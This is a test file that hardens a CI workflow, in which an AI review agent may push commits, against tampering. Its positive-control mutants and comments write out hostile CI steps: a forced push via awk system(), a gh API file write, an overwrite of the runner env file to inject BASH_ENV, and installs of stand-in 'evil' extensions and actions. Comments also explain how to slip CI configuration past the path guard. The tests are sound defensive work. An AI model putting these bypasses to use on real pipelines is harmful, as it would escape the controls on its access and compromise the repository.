      ['Report incomplete review', ['GH_TOKEN', 'WAKEUP_DETECTED', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
      ['Report skill-fetch failure', ['GH_TOKEN', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
      ['Remove re-review label', ['GH_TOKEN', 'PR', 'REPO', 'LABEL']],
    ]);
    // POSITIVE CONTROLS, one per position: a key added to a step that already has a block, and a
    // whole block added to the step that had none.
    const addedKey = src.replace(/^( {10}CHANGESET_BOT: .*\n)/m, '$1          BASH_ENV: /tmp/x.sh\n');
    expect(addedKey, 'the step env injection anchor moved').not.toBe(src);
    expect(stepEnvKeys(addedKey).find(([name]) => name.startsWith('Substantive-change'))?.[1]).toContain('BASH_ENV');
    // Inserted between the step's `uses:` and its `with:`, which is where a step-level `env:`
    // block goes and where it reaches one block only - the same two lines after `with:`'s own
    // keys would be YAML-legal and would make the action's inputs children of `env:` instead.
    const addedToAgent = src.replace(
      /^( {8}uses: anthropics\/claude-code-action@v1\n)/m,
      "$1        env:\n          CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: '0'\n"
    );
    expect(addedToAgent, 'the agent env injection anchor moved').not.toBe(src);
    expect(stepEnvKeys(addedToAgent).find(([name]) => name === 'Run /bot-review')?.[1]).toEqual([
      'CLAUDE_CODE_SUBPROCESS_ENV_SCRUB',
    ]);
    // POSITIVE CONTROLS: a new step in every spelling the list item may take. `name:` is optional
    // in the step schema and an unnamed step has blinded four sweeps in this file at once before,
    // so it has to REACH the pin rather than be skipped by it. The last two are the bare `-`
    // shapes: `-` alone on its line, with the mapping below it, is a legal step to YAML and
    // matched no `- ` sweep at all - so a whole `uses:` step (which has no `run:` body and so
    // trips none of the body sweeps either) was green across every assertion in this file.
    for (const [injected, unnamed] of [
      ['      - name: Publish the fold\n        run: |\n          echo hi\n', false],
      ['      - run: |\n          echo hi\n', true],
      ['      - uses: actions/checkout@v5\n', true],
      ['      -\n        name: Publish the fold\n        run: |\n          echo hi\n', true],
      ['      -\n        uses: evil/action@v1\n', true],
    ] as Array<[string, boolean]>) {
      const mutated = src.replace(
        /^ {6}- name: Report skill-fetch failure$/m,
        `${injected}      - name: Report skill-fetch failure`
      );
      const label = injected.split('\n')[0];
      expect(mutated, 'the step injection anchor moved').not.toBe(src);
      expect(stepNames(mutated), `a new step was not seen: ${label}`).toHaveLength(21);
      if (unnamed) expect(stepNames(mutated), `a name-less step was not seen: ${label}`).toContain(UNNAMED_STEP);
    }
  });

  it('never tells the agent to push', () => {
    // The push belongs to a `run:` step. Anything inside the review step's `prompt:` or
    // `claude_args:` is instruction to a model that has no shell to carry it out with, so a
    // `git push` there is either dead prose or a request to find a way around the tool fence.
    const reviewStep = step(src, 'Run /bot-review');
    expect(reviewStep).not.toMatch(/git push/);
  });

  it('tells the agent what FOLD_MODE actually is', () => {
    // The agent has no shell and `Read(//proc/**)` is denied, so it cannot read the process
    // environment. Without this interpolation the prompt's own rule ("anything else, including
    // unset, means review only") makes a fold run change nothing at all, silently.
    const reviewStep = step(src, 'Run /bot-review');
    expect(reviewStep).toMatch(/FOLD_MODE is '\$\{\{ env\.FOLD_MODE \}\}'/);

    // And what the guard will refuse, which is a DIFFERENT failure: the guard refuses the
    // whole fixup, so one path the prompt never warned about discards every good change in
    // the same run. The two lists drifted once already (`.changeset/` was added to the guard
    // and not to the prompt), and drift is silent on both sides, so the guard's own directory
    // arm is the source and the prompt and the operator-facing `reason=` string are checked
    // against it. Read out of the lifted region rather than restated here, or this becomes a
    // third copy to drift from.
    const pushBody = runBodiesRaw(step(src, 'Push fold commit')).join('\n');
    const roots = pushBody.match(/-e '\^\(([^)]*)\)\/'/)?.[1].split('|');
    expect(roots, 'could not read the path guard directory arm').toBeTruthy();
    expect(roots?.length).toBeGreaterThan(4);
    for (const root of roots ?? []) {
      const name = `${root.replace(/\\/g, '')}/`;
      expect(reviewStep, `the prompt does not name a directory the guard refuses: ${name}`).toContain(`\`${name}\``);
      expect(pushBody, `the refusal message does not name: ${name}`).toContain(`\`${name}\``);
    }
  });

  it('mints the fold token with contents: write and no workflow scope', () => {
    const mintStep = step(src, 'Mint fold push token');
    expect(mintStep).toMatch(/^\s*permission-contents: write$/m);
    // As a SET, like every other permission surface here: a `permission-*` key absent from this
    // list is a scope on the push token, and two substring assertions cannot see an added one.
    expect(withKeys(src, 'Mint fold push token').sort()).toEqual(
      ['client-id', 'owner', 'permission-contents', 'private-key', 'repositories'].sort()
    );
    // Not the control - the push step's path guard is - but withholding the scope is the
    // defence in depth behind it, and re-adding it widens the blast radius of a guard bug.
    expect(mintStep).not.toMatch(/permission-workflows/);
  });

  it('mints, pushes and reports on exactly the conditions it claims to', () => {
    // Asserted as a conjunct SET, by value. Substring assertions cannot see the difference
    // between a live gate and `... || true` appended to it, which neutralises the gate while
    // leaving every literal in place - and `always()` is true on cancellation, so it would
    // leave the mint and the push eligible on a run the user stopped.
    expect(ifConjuncts(src, 'Mint fold push token')).toEqual([
      '!cancelled()',
      "env.FOLD_MODE == 'true'",
      "steps.bot_review.outcome == 'success'",
      "steps.review_posted.outputs.posted == 'true'",
    ]);
    expect(ifConjuncts(src, 'Push fold commit')).toEqual([
      '!cancelled()',
      "env.FOLD_MODE == 'true'",
      "steps.push_token.outcome == 'success'",
    ]);
    // `Report fold failure` keys on the SAME measurement as the mint, which is what keeps it
    // from double-commenting with `Report incomplete review` (gated on the complement). And on
    // `!= 'success'` rather than `== 'failure'`, so a review that lands and then errors -
    // which skips the mint, the push and the no-op reporter in one go - still gets an
    // explanation instead of a bare red check.
    expect(ifConjuncts(src, 'Report fold failure')).toEqual([
      '!cancelled()',
      "env.FOLD_MODE == 'true'",
      "steps.review_posted.outputs.posted == 'true'",
      "(steps.push_token.outcome != 'success' || steps.fold_push.outcome != 'success')",
    ]);
    // The one reachable hole the gate cross-product had: every other fold reporter is
    // `!cancelled()` and `Report incomplete review` needs the complement of `posted`, so a
    // cancellation commented nothing while `Remove re-review label` (`always()`) consumed
    // the label anyway. The cancellation and the mode are the WHOLE gate on purpose: on
    // cancellation GitHub re-evaluates the `if:` of every unfinished step, so `posted` is
    // empty whenever the cancel landed during the agent step - which is most of the window
    // this reporter exists for - and `fold_push.outputs.pushed` is empty for a cancel
    // between the push landing and `emit true`. Conjoining either narrows this step to the
    // cases it is least needed for, so the body is worded for an unknown outcome instead.
    expect(ifConjuncts(src, 'Report cancelled fold')).toEqual(['cancelled()', "env.FOLD_MODE == 'true'"]);
    // And it must not assert an outcome it cannot measure.
    const cancelBody = step(src, 'Report cancelled fold');
    expect(cancelBody).not.toMatch(/nothing was pushed|branch is untouched|review above was posted/);
    expect(ifConjuncts(src, 'Report fold no-op')).toEqual([
      '!cancelled()',
      "env.FOLD_MODE == 'true'",
      "steps.fold_push.outcome == 'success'",
      "(steps.fold_push.outputs.pushed == 'none' || steps.fold_push.outputs.dropped != '')",
    ]);
    // And the two overlap-free halves of the ONE pair that used to collide, pinned by value on
    // both sides: the cancellation test is in `Report cancelled fold` and its negation is in
    // `Report incomplete review`, so a rewrite that drops either puts both back on the same
    // state. A `toMatch` cannot tell this conjunct from one disarmed with `|| true`.
    expect(ifLine(src, 'Report incomplete review')).toBe(
      "always() && !(cancelled() && env.FOLD_MODE == 'true') && (steps.bot_review.outcome == 'failure' || (steps.bot_review.outcome == 'success' && steps.bot_review.outputs.conclusion == 'success')) && steps.review_posted.outputs.posted != 'true'"
    );
    const noGuard = src.replace("always() && !(cancelled() && env.FOLD_MODE == 'true') && ", 'always() && ');
    expect(noGuard, 'the cancellation-guard anchor moved').not.toBe(src);
    expect(ifLine(noGuard, 'Report incomplete review')).toMatch(/^always\(\) && \(steps\.bot_review\.outcome/);
  });

  type StepState = {
    cancelled: boolean;
    foldMode: boolean;
    steps: Record<string, { outcome?: string; outputs?: Record<string, string> }>;
  };

  /**
   * Evaluates a step's `if:` on a state, by handing the SHIPPED condition text to the JS engine.
   *
   * GitHub's `if:` syntax for these gates is a subset of JavaScript - `always()`, `cancelled()`,
   * dot paths, `==`, `&&`, `||`, `!` - so the real string evaluates directly rather than being
   * re-modelled. That distinction is the whole point: a hand-written predicate per reporter would
   * be a second copy of the gate to drift from, which is the defect class this file keeps
   * re-finding. The condition is trusted content from the same commit as this test; a condition
   * using anything the JS engine cannot parse fails LOUDLY here rather than being skipped.
   */
  function stepFires(src: string, name: string, state: StepState): boolean {
    const condition =
      step(src, name).match(/^ {8}if: (?![|>])(.*)$/m)?.[1] ??
      step(src, name).match(/^ {8}if: \|\n((?: {10}.*\n)+)/m)?.[1];
    expect(condition, `${name}: no if:`).toBeTruthy();
    const env = { FOLD_MODE: state.foldMode ? 'true' : 'false' };
    const evaluate = new Function('always', 'cancelled', 'env', 'steps', `return (${condition});`);
    return Boolean(
      evaluate(
        () => true,
        () => state.cancelled,
        env,
        state.steps
      )
    );
  }

  it('fires at most one reporting comment on any state, and names the one it should', () => {
    // The cross-product the gate comments describe, EXECUTED rather than argued. Every reporter
    // reachable once the review step has run is included, so "at most one" is a property of that
    // whole set rather than of a pair - the collision this exists for was between two steps whose
    // comments had been reconciled in prose only. The two remaining commenters (the size-guard
    // skip and the changeset-only skip) are gated on `skip == 'true'`, which is mutually
    // exclusive with `bot_review.outcome == 'success'` here and is pinned by their own gates.
    const reporters = [
      'Report fold failure',
      'Report cancelled fold',
      'Report fold no-op',
      'Report incomplete review',
      'Report skill-fetch failure',
    ];
    // `bot_review` is held at the shape claude-code-action leaves on a successful review and
    // `skill_fetch` at success, so the four booleans below are the only axes that move.
    const state = (cancelled: boolean, posted: boolean, minted: boolean, pushed: boolean): StepState => ({
      cancelled,
      foldMode: true,
      steps: {
        bot_review: { outcome: 'success', outputs: { conclusion: 'success' } },
        skill_fetch: { outcome: 'success' },
        review_posted: { outcome: 'success', outputs: { posted: posted ? 'true' : '' } },
        push_token: { outcome: minted ? 'success' : 'failure' },
        fold_push: {
          outcome: pushed ? 'success' : 'failure',
          outputs: { pushed: pushed ? 'true' : 'blocked', dropped: '' },
        },
      },
    });
    const firing = (s: StepState) => reporters.filter(name => stepFires(src, name, s));

    for (const cancelled of [false, true]) {
      for (const posted of [false, true]) {
        for (const minted of [false, true]) {
          for (const pushed of [false, true]) {
            const on = firing(state(cancelled, posted, minted, pushed));
            expect(
              on.length,
              `more than one reporter commented: ${on.join(', ')} - cancelled=${cancelled} posted=${posted} minted=${minted} pushed=${pushed}`
            ).toBeLessThan(2);
          }
        }
      }
    }

    // And the rows that have to name a specific reporter, so "at most one" is not satisfied by
    // nothing firing. The first is the collision: a cancel landing before the review was measured.
    expect(firing(state(true, false, true, true))).toEqual(['Report cancelled fold']);
    expect(firing(state(true, true, true, true))).toEqual(['Report cancelled fold']);
    expect(firing(state(false, false, true, true))).toEqual(['Report incomplete review']);
    expect(firing(state(false, true, false, true))).toEqual(['Report fold failure']);
    expect(firing(state(false, true, true, false))).toEqual(['Report fold failure']);
    // The happy path is the one tuple that correctly comments nothing.
    expect(firing(state(false, true, true, true))).toEqual([]);
    // `Report fold no-op` covers both of its arms.
    for (const outputs of [
      { pushed: 'none', dropped: '' },
      { pushed: 'true', dropped: 'src/dropped.ts' },
    ]) {
      const s = state(false, true, true, true);
      s.steps.fold_push = { outcome: 'success', outputs };
      expect(firing(s)).toEqual(['Report fold no-op']);
    }
    // A failed skill fetch skips the review step, which is the shape the fifth reporter exists
    // for - and the review-step gates are all false on it, so it cannot double up.
    const skipped = state(false, false, false, false);
    skipped.steps.skill_fetch = { outcome: 'failure' };
    skipped.steps.bot_review = { outcome: 'skipped', outputs: {} };
    expect(firing(skipped)).toEqual(['Report skill-fetch failure']);

    // The FIFTH axis that loop holds fixed at `skill_fetch: success`, and the state outside it.
    // `Report skill-fetch failure` was `always() && outcome == 'failure'`: no `cancelled()` and no
    // FOLD_MODE guard, so on a cancellation it fired beside `Report cancelled fold`. And the
    // review step was not gated on the fetch at all, so this comment's own claim - "no review ran"
    // - was false, and an un-cancelled fetch failure with a review that posted nothing fired
    // beside `Report incomplete review`. Both halves are bound here: the report is `!cancelled()`
    // and the review step now requires the fetch to have succeeded, which is what makes its
    // message true rather than merely reassuring.
    expect(ifLine(src, 'Run /bot-review')).toBe(
      "steps.size_check.outputs.skip == 'false' && steps.substantive.outputs.skip == 'false' && steps.skill_fetch.outcome == 'success'"
    );
    // As conjuncts off a BLOCK scalar, not a single-line `if:`: a plain YAML scalar may not start
    // with `!`, so writing this gate on one line is a workflow that will not load at all. The
    // reader below is what pins it; `ifLine` would silently read a different spelling.
    expect(ifConjuncts(src, 'Report skill-fetch failure')).toEqual([
      '!cancelled()',
      "steps.skill_fetch.outcome == 'failure'",
    ]);
    for (const cancelled of [false, true]) {
      const noSkill = state(cancelled, false, false, false);
      noSkill.steps.skill_fetch = { outcome: 'failure' };
      noSkill.steps.bot_review = { outcome: 'skipped', outputs: {} };
      expect(firing(noSkill), `a failed skill fetch was outside the sweep: cancelled=${cancelled}`).toEqual([
        cancelled ? 'Report cancelled fold' : 'Report skill-fetch failure',
      ]);
    }
  });

  it('commits only tracked-file edits, and fails rather than falling through', () => {
    const commands = withoutComments(step(src, 'Push fold commit'));
    // Tracked files only, and pinned as the whole set of staging invocations IN THE FILE
    // rather than in this step: with Write in hand the agent can drop a NEW file into the
    // tree, and an appended `git add -- .` would commit it while leaving `git add -u` in
    // place for a pattern check to find. Swept file-wide because a step-scoped assertion
    // is a property of a NAME - any of this can be moved to a step the assertion does not
    // ask for. `update-index --add` and `stage` are the two spellings that stage a path
    // without the word `add` being the subcommand.
    // Found in the PARSED command, not in the text: `git -c core.autocrlf=false add -- .`
    // appended after `git add -u` reads as a second staging invocation to git and as no
    // staging invocation at all to a matcher wanting `git add` with one space between.
    expect(gitCommands(src, /^(add|update-index|stage)$/).map(words => words.map(unquoteWord))).toEqual([
      ['git', 'add', '-u'],
    ]);
    // That sweep is a denylist of the three subcommands whose NAME says "stage", so it bounds
    // only the spellings it enumerates: `git apply --cached` writes arbitrary content straight
    // into the index and is none of them, and placed between the path guard and the commit it
    // stages CI configuration the guard has already finished looking at. Pinned here as the
    // whole set of git subcommands the file uses, so the next one has to be justified rather
    // than merely not guessed at.
    expect(gitSubcommands(src)).toEqual([
      'add',
      'cat-file',
      'commit',
      'diff',
      'log',
      'ls-files',
      'push',
      'rev-parse',
      'show',
    ]);
    // `commit`'s own argv, by value, because `show` and `commit` are both on that allowlist,
    // both legitimate, and the pair still composes into a complete path-guard bypass:
    // `git show HEAD:README.md > .github/workflows/ci.yml` writes into the WORKING TREE, which
    // the guard never looks at because it reads the index, and `commit -a` then re-stages it
    // after the guard has finished. `-a`, `--all`, `--include`, `--only` and a trailing
    // pathspec all re-stage at commit time, so the flags and the operand COUNT are pinned
    // rather than searched for. The end state is asserted behaviourally below as well.
    const commits = gitCommands(src, /^commit$/).map(words => words.map(unquoteWord));
    expect(commits).toHaveLength(1);
    const commitArgv = commits[0].slice(commits[0].indexOf('commit') + 1);
    expect(commitArgv.filter(word => word.startsWith('-'))).toEqual(['--no-verify', '--no-gpg-sign', '-m', '-m', '-m']);
    // Three operands, which are the three `-m` values. A fourth would be a pathspec.
    expect(commitArgv.filter(word => !word.startsWith('-'))).toHaveLength(3);
    // `set` by value, everywhere in the file. `set +e` in this step turns a failed `git commit`
    // into a fall-through to a push that says `Everything up-to-date` and exits 0 - the exact
    // end state the `-e` comment above says it prevents - and it is a one-character edit to a
    // line every assertion here was content merely to FIND.
    expect(commandsNamed(src, /^set$/)).toEqual([
      ['set', '-euo', 'pipefail'],
      ['set', '-uo', 'pipefail'],
      ['set', '-euo', 'pipefail'],
      ['set', '-uo', 'pipefail'],
    ]);
    // `awk` by value, everywhere in the file, PROGRAM TEXT INCLUDED. It is the one entry in
    // `PROGRAMS` whose argument is itself a program: `awk 'BEGIN{system("git push --force
    // origin HEAD:main")}' /dev/null` is arbitrary execution in the step holding the push
    // token, and it names no guard - every git-detecting sweep here requires the PARSED
    // program to be `git`, and awk's is a single quoted word. The shape is idiomatic in this
    // step, which already runs awk twice. Pinning the invocations rather than scanning their
    // text for `system`/`print | "sh"`/`|&` keeps this an allowlist: a new awk program is a
    // deliberate edit here, whatever it is spelled as. It is not the only entry of that shape:
    // `git` takes a program through `-c <key>=<value>` (`gitConfigKeys`, pinned by value),
    // `jq -f <path>` names one and is exempted by `DATA_ONLY_COMMANDS` (the shipped invocation
    // is pinned by value just below, the FLAG is not bounded), and `sudo` runs upstream of the
    // agent; `python3` runs only as `-I -` fed from the object store, pinned separately.
    // Quotes are removed the way the SHELL removes them, so the pinned rows are the words awk
    // actually receives: the double quotes inside the program text survive, because the shell
    // keeps them - they are inside single quotes - and stripping them here would be reading a
    // program awk never runs. Two spellings of one word still collapse when the shell would
    // produce the same word (`-F'\t'` and `-F"\t"` both), which is what makes the pin a bound on
    // the PROGRAM rather than on its punctuation.
    expect(commandsNamed(src, /^awk$/)).toEqual([
      ['awk', '-F\\t', '$1 == "-" { print $3 }', '$STAGED_NUMSTAT'],
      ['awk', '{ n += ($1 == "-" ? 0 : $1) + ($2 == "-" ? 0 : $2) } END { print n + 0 }'],
    ]);
    // POSITIVE CONTROL for that pin, along its own axis: a by-value `toEqual` is only a bound
    // if a THIRD invocation reaches it, and `awk` is reported as a program only when the
    // prefix walk above reads past whatever heads it.
    for (const injected of [
      `awk 'BEGIN{ system("git push --force origin HEAD:main") }'`,
      `sudo awk 'BEGIN{ system("id") }' /dev/null`,
      `'env' awk 'BEGIN{ print | "sh" }' /dev/null`,
    ]) {
      const mutated = src.replace(
        /^ {6}- name: Report skill-fetch failure$/m,
        `      - name: Publish the fold\n        run: |\n          ${injected}\n      - name: Report skill-fetch failure`
      );
      expect(mutated, 'the injection anchor moved').not.toBe(src);
      expect(commandsNamed(mutated, /^awk$/).length, `an awk program was not seen: ${injected}`).toBe(3);
    }
    // The other two entries whose argument can name or carry a program, pinned the same way.
    // `jq -f <path>` runs a repo-tracked filter program, and `jq` is in `DATA_ONLY_COMMANDS`
    // so the tree-execution sweep exempts it by name. `apt-get` runs arbitrary maintainer
    // scripts as root; it is upstream of the agent, which is what makes the shipped pair safe
    // rather than anything about the command, so a THIRD one has to be justified here.
    // The program text is pinned as the SHELL passes it. The filter is single-quoted in the
    // workflow, so the double quotes inside it are part of the string jq receives and are kept
    // here - stripping them would pin a program that never runs. The redirection words are kept
    // too: a `2>` appearing where one did not is a change to where this command's output goes.
    expect(commandsNamed(src, /^jq$/)).toEqual([
      [
        'jq',
        '-s',
        '-e',
        'map(if type == "array" then .[] else . end)\n' +
          '                       | any(.[]; (.message.content? // []) | any(.[]?; .type == "tool_use" and .name == "ScheduleWakeup"))',
        '$DEST',
        '>/dev/null',
        '2>',
      ],
    ]);
    expect(commandsNamed(src, /^apt-get$/)).toEqual([
      ['apt-get', 'update'],
      ['apt-get', 'install', '-y', 'bubblewrap'],
    ]);
    // Every program any `run:` body invokes, as a whole SET. See `invokedPrograms`: the sweeps
    // in this file are each written in terms of the program they bound, so `sh -c 'git apply
    // --cached ...'`, `xargs git apply --cached` and `trap 'exit 0' ERR` reach what they bound
    // while naming none of it. A new entry here is a deliberate edit; `sh`, `bash`, `xargs`,
    // `eval`, `trap`, `curl` and `python` are not entries.
    expect(invokedPrograms(src)).toEqual(PROGRAMS);
    // And every command head this parser cannot resolve, by value. All of them are `case` arm
    // patterns in the push step's failure classifier; a globbed head anywhere else is an
    // indirection the PROGRAMS set above cannot see, and it has to be justified here first.
    expect(programHeads(src).globbed).toEqual([
      '*',
      '*403*',
      '*[Pp]ermission*',
      '*behind its remote*',
      '*denied*',
      '*fetch first*',
      '*non-fast-forward*',
      '*refusing to allow*',
    ]);
    // `gh` is treated as data-only by the sweeps above because every call in the file reads, and
    // `checkoutCodeReferences` exempts it by name. It does not have to read, and the two shapes
    // that matter name nothing any sweep above looks for. `gh api --method PUT
    // repos/$REPO/contents/<path>` commits a file through the API, routing around the staging
    // sweep, the path guard, the size bound, the non-force and the refspec restriction at once.
    // `gh release download --output /home/runner/work/_temp/_runner_file_commands/set_env_x`
    // writes the runner's env file with NO redirection and no runner variable anywhere in the
    // body: `redirectionTargets` reads redirects, `runnerFileCommandMentions` reads the two
    // names, and the path here is a literal, so all three read the file unchanged at 31/31.
    // `$RUNNER_TEMP` is `/home/runner/work/_temp` on the pinned runner, so that step then sets
    // `BASH_ENV` for `Push fold commit`.
    //
    // Bounded as whole SETS - the subcommand and every flag - rather than as a denylist of the
    // flag spellings someone thought of. The reach is not a finite list: `--method`/`--input`/
    // `--field`/`--raw-field` write through the API, `--output`/`--pattern` write files, `gh
    // extension install <repo>` followed by `gh <ext>` runs a program, and pflag lets a boolean
    // shorthand cluster ahead of a value-taking one, so `-iXPUT` is `--include --method PUT` with
    // no separator for an anchored matcher to find. Pinning the sets means a new subcommand, or a
    // new flag in any spelling, has to be justified here first. The values are deliberately NOT
    // pinned: every `gh pr comment` carries a long message body that is prose, and pinning prose
    // would make this a wording check rather than a capability bound. Stated as a residual rather
    // than left to be found: a VALUE can still be edited, and what bounds that is elsewhere - the
    // tokens any `gh` call holds are the repo-scoped GITHUB_TOKEN and the b4m-devtools READ token,
    // and no `gh` runs in the step holding the push token (asserted just below).
    const ghInvocations = (src: string) => commandsNamed(src, /^gh$/);
    const ghSubcommands = (src: string) =>
      [...new Set(ghInvocations(src).map(words => words.slice(1).find(word => !word.startsWith('-')) ?? ''))].sort();
    const ghFlags = (src: string) =>
      [...new Set(ghInvocations(src).flatMap(words => words.slice(1).filter(word => word.startsWith('-'))))].sort();
    expect(ghSubcommands(src)).toEqual(['api', 'pr']);
    expect(ghFlags(src)).toEqual(['--body', '--jq', '--json', '--paginate', '--remove-label', '--repo']);
    // POSITIVE CONTROLS, one per reach. The first two were live at 31/31 against a filter that
    // read flag SPELLINGS; the last two are the axes that filter could not see at all.
    for (const [injected, subcommand, flag] of [
      ['gh api --method PUT repos/$REPO/contents/x -f content=y', 'api', '--method'],
      ['gh api -XPUT repos/$REPO/contents/x -fcontent=y', 'api', '-XPUT'],
      [
        'gh release download v1 --pattern "*" --output /home/runner/work/_temp/_runner_file_commands/set_env_x',
        'release',
        '--output',
      ],
      ['gh extension install evil/tool', 'extension', undefined],
    ] as Array<[string, string, string | undefined]>) {
      const mutated = src.replace(
        /^ {6}- name: Report skill-fetch failure$/m,
        `      - name: Publish the fold\n        run: |\n          ${injected}\n      - name: Report skill-fetch failure`
      );
      expect(mutated, 'the injection anchor moved').not.toBe(src);
      expect(ghSubcommands(mutated), `a gh subcommand was not seen: ${injected}`).toContain(subcommand);
      if (flag) expect(ghFlags(mutated), `a gh flag was not seen: ${injected}`).toContain(flag);
    }
    // And no `gh` at all in the step that holds PUSH_TOKEN.
    expect(commandsNamed(step(src, 'Push fold commit'), /^gh$/)).toEqual([]);
    // The step must fail rather than fall through: without `-e` a failed `git commit`
    // reaches `git push`, which says "Everything up-to-date" and exits 0, so the step
    // emits pushed=true under a green check with nothing on the branch.
    expect(commands).toMatch(/^ {10}set -euo pipefail$/m);
    // And both bounds run before the commit, not after it.
    expect(commands.indexOf('BLOCKED=')).toBeLessThan(commands.indexOf('git -c user.name'));
    expect(commands.indexOf('CHANGED=')).toBeLessThan(commands.indexOf('git -c user.name'));

    // Every exit out of this step, as an (emit argument, next command) vector. `emit` here does
    // NOT exit - unlike its namesake in the posted step - so the explicit `exit` after each
    // call is what makes the step's OUTCOME agree with the value it just reported. Dropping the
    // `exit 1` after the last one leaves a failed push exiting 0, which is
    // `steps.fold_push.outcome == 'success'`, which skips `Report fold failure`: a green check,
    // no commit on the branch and no comment saying so. The whole region the harness below
    // executes stops at the size bound, so nothing else in this file can see that.
    const KEYWORD_ONLY = /^(then|fi|else|elif|do|done|esac|in)$/;
    const sequence = shellCommands(runBodies(step(src, 'Push fold commit'))[0] ?? '')
      .map(command => ({ words: command.words.map(unquoteWord), sep: command.sep }))
      .filter(entry => !(entry.words.length === 1 && KEYWORD_ONLY.test(entry.words[0])));
    // `emit() { ... }` parses as a bare `emit` with no argument, which is how the DEFINITION
    // is told from a call. Pinned by value, because the pairing below only means anything while
    // emit itself does not exit - the posted step's namesake does.
    expect(commands).toMatch(/^ {10}emit\(\) \{ echo "fold_push: \$1"; echo "pushed=\$1" >> "\$GITHUB_OUTPUT"; \}$/m);
    // The SEPARATOR on each side, not only the ordering. A pair's index adjacency says nothing
    // about what the `exit` means: `emit false || exit 1` never reaches the exit (emit succeeds),
    // and `( emit false; exit 1 )` exits only the subshell. Both are index-adjacent and both
    // reach the end state the comment above names.
    const exits = sequence.flatMap((entry, i) =>
      entry.words[0] === 'emit' && entry.words.length === 2
        ? [[entry.words[1], entry.sep, (sequence[i + 1]?.words ?? []).join(' '), sequence[i + 1]?.sep ?? '']]
        : []
    );
    expect(exits).toEqual([
      ['none', '\n', 'exit 0', '\n'],
      ['blocked', '\n', 'exit 1', '\n'],
      ['blocked', '\n', 'exit 1', '\n'],
      ['true', '\n', 'exit 0', '\n'],
      ['false', '\n', 'exit 1', '\n'],
    ]);
  });

  it('refuses the whole fixup when a staged path is CI configuration', () => {
    // Behaviour, not text. The guard is lifted out of the committed YAML and run against a
    // scratch index: `grep -v -E`, a dropped `--cached` and an `^zzz(...)`-prefixed anchor
    // each disarm it completely while leaving every literal it names in place.
    const blocked = [
      '.github/workflows/pr-bot-review.yml',
      '.husky/pre-commit',
      '.claude/settings.json',
      // `changeset version` executes the changelog module `.changeset/config.json` names, and
      // this repo's config names a tracked local `.cjs`, so the directory is executable config.
      '.changeset/config.json',
      '.changeset/changelog-github-retry.cjs',
      'scripts/check-no-control-bytes.sh',
      'infra/subscriberFanout.ts',
      'patches/some-dep.patch',
      'package.json',
      'packages/scripts/package.json',
      'pnpm-lock.yaml',
      'pnpm-workspace.yaml',
      'turbo.json',
      '.npmrc',
      '.dockerignore',
      'Dockerfile',
      // Suffixed variants: these are tracked and used to pass a basename-exact arm whose
      // refusal string, guard comment and agent prompt all promised they did not.
      'apps/client/Dockerfile.chatcompletion',
      'apps/client/Dockerfile.chatcompletion.selfhost',
      'selfhost/ws-gateway/Dockerfile',
      'apps/client/tools/helper.sh',
      // Not under a blocked root, so these exercise the extension arm and not the path arm.
      'packages/cli/tools/build.bash',
      'apps/client/tools/setup.zsh',
      // Two categories rather than the names that happen to be tracked today. The
      // extensionless-root arm shipped once as an enumeration and once as a category that
      // never reached grep, so every arm of both is exercised here individually below.
      'dev',
      'sst-dev-fast',
      'some-new-root-script',
      'LICENSE',
      'NOTICE',
      // Root dotfiles. Each is a tool's configuration, and `.mcp.json` in particular is an
      // MCP server definition, i.e. command execution for the very CLI this job runs.
      '.mcp.json',
      '.gitignore',
      '.gitattributes',
      '.semgrep.yml',
      '.gitleaks.toml',
      '.gitleaksignore',
      '.envrc',
      '.some-new-root-dotfile',
    ];
    const allowed = [
      'apps/client/app/components/Foo.tsx',
      'b4m-core/common/src/api-contract/chat.contract.ts',
      'packages/scripts/src/checkBotFoldWritePath.test.ts',
      'packages/database/src/models/user.ts',
      'README.md',
      'docs/architecture.md',
    ];

    // Refuses on the whole set, and names every blocked path rather than the first.
    const all = runStagedGuards(
      src,
      [...blocked, ...allowed].map(p => ({ path: p }))
    );
    expect(all.status).toBe(1);
    expect(all.out).not.toContain('GUARDS_PASSED');
    expect(all.out).toContain('emit:blocked');
    for (const p of blocked) expect(all.out).toContain(p);
    for (const p of allowed) expect(all.out).not.toContain(p);

    // Each blocked path on its own, so one decayed pattern cannot hide behind the others.
    for (const p of blocked) {
      expect(runStagedGuards(src, [{ path: p }]).status, `not blocked: ${p}`).toBe(1);
    }
    // And ordinary source passes, or the guard is a fold that never applies anything.
    const clean = runStagedGuards(
      src,
      allowed.map(p => ({ path: p }))
    );
    expect(clean.status, clean.out).toBe(0);
    expect(clean.out).toContain('GUARDS_PASSED');
  });

  it('sees a comment that breaks the guard, rather than normalising it away', () => {
    // POSITIVE CONTROL for the harness itself, not for the guard. `runStagedGuards` used to
    // strip comments before executing, which repaired the file and then certified the
    // repair - and the defect it repaired is the one reproduced here: bash removes a
    // backslash-newline BEFORE it tokenizes, so a `#` line between two continued `grep -E`
    // arguments terminates the command there. The arms after it never reach grep, the
    // orphaned `-e` runs as a program, `|| true` swallows the failure, and the step exits 0
    // having lost an arm. That exact shape shipped, and the suite stayed green over it.
    //
    // So: inject it, and require this harness to go RED. If this test ever passes because
    // the injection stopped mattering, the harness has started normalising again.
    const broken = src.replace(
      /^( {14}-e '\\\.\(sh\|bash\|zsh\)\$' \\\n)( {14}-e '\^\[\^\/\.\]\+\$' \\\n)/m,
      '$1              # A comment here ends the grep, silently.\n$2'
    );
    expect(broken, 'the injection anchor moved').not.toBe(src);
    // The arms after the comment are gone, so an extensionless root file sails through.
    const mutant = runStagedGuards(broken, [{ path: 'dev' }]);
    expect(mutant.status, mutant.out).toBe(0);
    // While the shipped bytes block it - which is the pair that makes the above meaningful.
    expect(runStagedGuards(src, [{ path: 'dev' }]).status).toBe(1);
  });

  it('refuses a staged binary and a non-ASCII CI path', () => {
    // numstat reports `-` changed lines for a binary however large the rewrite, so the size
    // bound scores it 0; it is the path guard's job.
    const binary = runStagedGuards(src, [{ path: 'apps/client/public/logo.png', binary: true }]);
    expect(binary.status).toBe(1);
    expect(binary.out).toContain('apps/client/public/logo.png');
    // Under git's default core.quotePath, a path holding a non-ASCII byte comes out quoted
    // and backslash-escaped: the leading quote defeats the `^(...)/` anchor and the trailing
    // one defeats `\.(sh|bash|zsh)$`, so the guard matches nothing at all for such a file.
    // Written as an escape to keep this file ASCII per CLAUDE.md.
    const nonAscii = runStagedGuards(src, [{ path: '.github/workflows/caf\u00e9.yml' }]);
